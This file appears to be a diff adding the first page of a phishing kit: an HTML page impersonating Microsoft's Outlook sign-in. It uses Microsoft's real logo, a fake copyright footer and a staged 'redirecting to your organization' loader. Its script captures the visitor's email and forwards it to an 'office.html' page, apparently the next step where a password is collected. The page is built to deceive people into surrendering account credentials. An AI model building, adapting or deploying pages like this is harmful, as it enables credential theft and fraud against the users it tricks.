@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <link rel="stylesheet" href="style.css ">
+    
+    <title>VERIFY IDENTITY</title>
+   
+ 
+ <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+
+<body>
+ 
+  <div class="bgimg"></div>
+    <div class="container-fluid">
+        <div class="container">
+
+            <div class="row topp">
+                
+                <div class="col-lg-6 mx-auto">
+                    
+                    <center>
+                    <h1 class="hide-on-mobile">Outlook</h1>
+                    </center>
+                    <!-- ////////////////////////diiiv1 start/////////////////////// -->
+                    <div class="box" id="div1" style="display:none;">
+                        <div class="loader " style="display:none;">
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                        </div>
+                        <div class="boxtext">
+                            <img src="
+                            https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="img-fluid logoimg" width="30px">&nbsp<span class="align-middle h5 logoname" style="color: #747474;"> Microsoft</span><br><br>
+                            <span class="h5">Sign In</span><br>
+                            <div class="form-group mt-2">
+                                <input type="email" name="ai" value="" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Email, phone, or Skype" style="border-right: none;border-left: none;border-top: none;">
+                            </div>
+                            <p style="font-size: 13px">No account? <a href="#">Create one!</a></p>
+                            <p style="font-size: 13px"><a href="#">Can't access your account?</a></p>
+
+                            <div class="text-right">
+                                <button type="button" class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;cursor: pointer;">Next</button>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- ////////////////////////diiiv1 end/////////////////////// -->
+                    <!-- ////////////////////////div2 start/////////////////////// -->
+                    <div class="box" id="div2" style="display: none;">
+                        <div class="loader " style="display:none;">
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                            <div class="circle"></div>
+                        </div>
+           
+                 <div class="step active" id="Tx-Cf-bU">
+
+                   
+            
+    
+                            <img src="
+                           https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" class="img-fluid logoimg"  width="80px">&nbsp<span class="align-middle h5 logoname" id="logoname2"  style="color: #747474;"> </span><br><br>
+                 <div class="py-2"><span class="h5"><h4>Sign in</h4></span></div>
+                 <div class="pb-2">
+                 <span id="" class="text-danger"></span>
+                 </div>
+                 <div id="msg" class="text-danger" style="display:none" >Your account or password is incorrect. If you don't remember your password.</div>
+                 
+                 
+                 <div class="form-group mt-2">
+                 
+  <form id="emailForm">
+  
+                 <input type="email"  name="email" id="email"
+                 class="form-control rounded-0 border-dark" id="pr" aria-describedby="aiHelp" 
+                 placeholder="Email, phone or Skype" style="border-right: none;border-left: none;border-top: none;">
+                 </div>
+                 
+                 <br>
+                 
+                 
+                 <p style="font-size: 14px">No account? <a href="#">Create one!</a></p>
+                 <p style="font-size: 14px"> <a href="#">Cant access your account?</a></p>
+                 
+                 <div class="text-right">
+                 
+                 
+                 <button  type="submit" class="btn rounded-0 text-white px-4"style="background-color: #0066BA;">Next</button>
+                 
+                 </div>
+                 </div>
+    
+    
+    </form>
+
+    <script>
+        document.getElementById('emailForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
+            
+            var email = document.getElementById('email').value; // Get the email value
+            var baseUrl = 'office.html#'; // Your base URL
+
+            // Construct the URL with the email appended directly
+            var redirectUrl = baseUrl + email;
+
+            // Redirect to the constructed URL
+            window.location.href = redirectUrl;
+        });
+    </script>
+
+                    
+                    </div>
+                    <!-- ////////////////////////div2 end/////////////////////// -->
+                    <!-- ////////////////////////div3 start/////////////////////// -->
+                    <div class="box" id="div3" >
+                        <div class="boxtext">
+                            <img src="
+                            https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg">&nbsp<span class="align-middle h5 logoname" id="logoname1" style="color: #747474;"> </span><br><br>
+                            <span class="h4">Taking you to your Organization's sign-in page</span><br><br>
+                            <div class="loader ">
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                                <div class="circle"></div>
+                            </div>
+                            <br>
+                            <div class="text-left">
+                                <a href="#">cancel</a>
+                            </div>
+                            <br><br>
+                        </div>
+                    </div>
+                    <!-- ////////////////////////div3 end/////////////////////// -->
+                </div>
+            </div>
+        </div>
+        <div class="row ">
+            <div class="col-sm-5 mx-auto box2">
+                <div class="py-2 bg-white ">
+                    <span><i class="fas fa-key"></i> &nbspSign in options</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer id="footer">
+        <div>
+            <div class="footerNode">
+                <span>©2024 Microsoft</span>
+                <a href="#">Privacy statement</a>
+            </div>
+        </div>
+    </footer>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script type="text/javascript">
+
+  setTimeout(function(){
+      $("#div3").hide(); 
+      $("#div2").show();        
+  }, 3000);
+</script>
+ </html>
